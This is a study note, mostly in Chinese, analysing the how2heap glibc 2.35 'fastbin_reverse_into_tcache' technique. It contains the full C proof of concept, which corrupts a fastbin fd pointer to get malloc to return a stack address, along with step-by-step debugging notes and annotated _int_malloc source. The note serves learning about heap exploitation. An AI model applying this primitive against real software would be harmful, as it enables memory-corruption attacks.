# PoC
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>

const size_t allocsize = 0x40;

int main(){
	setbuf(stdout, NULL);

	printf("\n"
		   "This attack is intended to have a similar effect to the unsorted_bin_attack,\n"
		   "except it works with a small allocation size (allocsize <= 0x78).\n"
		   "The goal is to set things up so that a call to malloc(allocsize) will write\n"
		   "a large unsigned value to the stack.\n\n");
	printf("After the patch https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n"
		   "An heap address leak is needed to perform this attack.\n"
		   "The same patch also ensures the chunk returned by tcache is properly aligned.\n\n");

	// Allocate 14 times so that we can free later.
	char* ptrs[14];
	size_t i;
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}
	
	printf("First we need to free(allocsize) at least 7 times to fill the tcache.\n"
	  	   "(More than 7 times works fine too.)\n\n");
	
	// Fill the tcache.
	for (i = 0; i < 7; i++) free(ptrs[i]);
	
	char* victim = ptrs[7];
	printf("The next pointer that we free is the chunk that we're going to corrupt: %p\n"
		   "It doesn't matter if we corrupt it now or later. Because the tcache is\n"
		   "already full, it will go in the fastbin.\n\n", victim);
	free(victim);
	
	printf("Next we need to free between 1 and 6 more pointers. These will also go\n"
		   "in the fastbin. If the stack address that we want to overwrite is not zero\n"
		   "then we need to free exactly 6 more pointers, otherwise the attack will\n"
		   "cause a segmentation fault. But if the value on the stack is zero then\n"
		   "a single free is sufficient.\n\n");
	
	// Fill the fastbin.
	for (i = 8; i < 14; i++) free(ptrs[i]);
	
	// Create an array on the stack and initialize it with garbage.
	size_t stack_var[6];
	memset(stack_var, 0xcd, sizeof(stack_var));
	
	printf("The stack address that we intend to target: %p\n"
		   "It's current value is %p\n", &stack_var[2], (char*)stack_var[2]);
	
	printf("Now we use a vulnerability such as a buffer overflow or a use-after-free\n"
			"to overwrite the next pointer at address %p\n\n", victim);
	
	//------------VULNERABILITY-----------
	
	// Overwrite linked list pointer in victim.
	// The following operation assumes the address of victim is known, thus requiring
	// a heap leak.
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
	
	//------------------------------------
	
	printf("The next step is to malloc(allocsize) 7 times to empty the tcache.\n\n");
	
	// Empty tcache.
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
	
	printf("Let's just print the contents of our array on the stack now,\n"
			"to show that it hasn't been modified yet.\n\n");
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	printf("\n"
		   "The next allocation triggers the stack to be overwritten. The tcache\n"
		   "is empty, but the fastbin isn't, so the next allocation comes from the\n"
		   "fastbin. Also, 7 chunks from the fastbin are used to refill the tcache.\n"
		   "Those 7 chunks are copied in reverse order into the tcache, so the stack\n"
		   "address that we are targeting ends up being the first chunk in the tcache.\n"
		   "It contains a pointer to the next chunk in the list, which is why a heap\n"
		   "pointer is written to the stack.\n"
		   "\n"
		   "Earlier we said that the attack will also work if we free fewer than 6\n"
		   "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
		   "That's because the value on the stack is treated as a next pointer in the\n"
		   "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
		   "\n"
		   "The contents of our array on the stack now look like this:\n\n");
	
	malloc(allocsize);
	
	for (i = 0; i < 6; i++) printf("%p: %p\n", &stack_var[i], (char*)stack_var[i]);
	
	char *q = malloc(allocsize);
	printf("\n"
			"Finally, if we malloc one more time then we get the stack address back: %p\n", q);
	
	assert(q == (char *)&stack_var[2]);
	
	return 0;
}
```
该攻击能够通过修改一个fastbin的fd指针，达成向任意地址写任意值/0/堆地址（有ptr保护）/tcache的key。
# 调试分析
## 1.填满tcache
```
	for (i = 0; i < 14; i++) {
		ptrs[i] = malloc(allocsize);
	}

	for (i = 0; i < 7; i++) free(ptrs[i]);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 155859.png]]
## 2.free目标chunk
```
	char* victim = ptrs[7];
	free(victim);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 155922.png]]
## 3.free共7个fastbin chunk
```
	for (i = 8; i < 14; i++) free(ptrs[i]);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 155948.png]]
## 4.修改目标chunk的fd指针(VULNERABILITY)
```
	*(size_t**)victim = (size_t*)((long)&stack_var[0] ^ ((long)victim >> 12));
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 160233.png]]
fastbin的fd指针维护的是chunk头的地址组成的链表，所以实际写next指针和key的地址为`victim+0x10`与`victim+0x18`，后续清空key，与再次malloc进行覆写的起始地址也是这里。
## 5.清空tcache
```
	for (i = 0; i < 7; i++) ptrs[i] = malloc(allocsize);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 160543.png]]
## 6.malloc进行fastbin维护
```
	malloc(allocsize);
```
这里上下对比，可以看到上下链表维护的指针差0x10。
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 160613.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 160623.png]]
int_malloc会把fastbin中对应大小的chunk尽可能地放入对应的tcache（都按照正常使用链表的顺序，头插头取），函数中会覆盖glibc中fastbin指针数组后，调用tcache_put将该chunk放入tcache。

注意原文中这句：
```
		 "Earlier we said that the attack will also work if we free fewer than 6\n"
		   "extra pointers to the fastbin, but only if the value on the stack is zero.\n"
		   "That's because the value on the stack is treated as a next pointer in the\n"
		   "linked list and it will trigger a crash if it isn't a valid pointer or null.\n"
		   "\n"
```
由于该循环会执行到tcache满，或fastbin链表结束（fd指针为0），所以会将victim的fd指针偏移处当作下一个chunk，所以如果是其他值就可能在几次或一次整理后crash。

理论上如果能在相应位置布置有保护的chunk指针也能绕过，但很难qwq。

还有一个可以利用的思路是，修改某个chunk的fd指针为一个未free chunk，利用这段代码将该chunk放进tcache，再进一步利用。
## 7.再次malloc申请目标地址
```
	char *q = malloc(allocsize);
```
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 160700.png]]
![[notes/pwn/堆利用/how2heap源码分析/2.35/fastbin_reverse_into_tcache/图/屏幕截图 2026-02-18 162012.png]]

# int_malloc的fastbin部分源码分析

常规的链表维护与chunk分配不再看，主要看`#if USE_TCACHE`部分对tcache与fastbin的维护。
```
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (__glibc_unlikely (misaligned_chunk (victim)))
	    malloc_printerr ("malloc(): unaligned fastbin chunk detected 2");

	  if (SINGLE_THREAD_P)
	    *fb = REVEAL_PTR (victim->fd);
	    //先取出一个chunk用于分配
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
	      //判断tcache存在，大小在tcache内
		{
		  mchunkptr tc_victim;

		  /* While bin not empty and tcache not full, copy chunks.  */
		  while (tcache->counts[tc_idx] < mp_.tcache_count
			 && (tc_victim = *fb) != NULL)
			 //判断对应大小的tcache没满，fastbin的fd指针是否为0，取fastbin的第一个chunk的地址
		    {
		      if (__glibc_unlikely (misaligned_chunk (tc_victim)))
			malloc_printerr ("malloc(): unaligned fastbin chunk detected 3");
		      if (SINGLE_THREAD_P)
			*fb = REVEAL_PTR (tc_victim->fd);
			//维护glibc中的fastbin链表头，取出第一个chunk
		      else
			{
			  REMOVE_FB (fb, pp, tc_victim);
			  if (__glibc_unlikely (tc_victim == NULL))
			    break;
			}
		      tcache_put (tc_victim, tc_idx);
		      //去除的chunk放入tcache
		    }
		}
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
}
```

# 攻击流程
1. 能修改fastbin chunk的fd指针，能泄露堆地址。
2. 如上（调试分析部分）
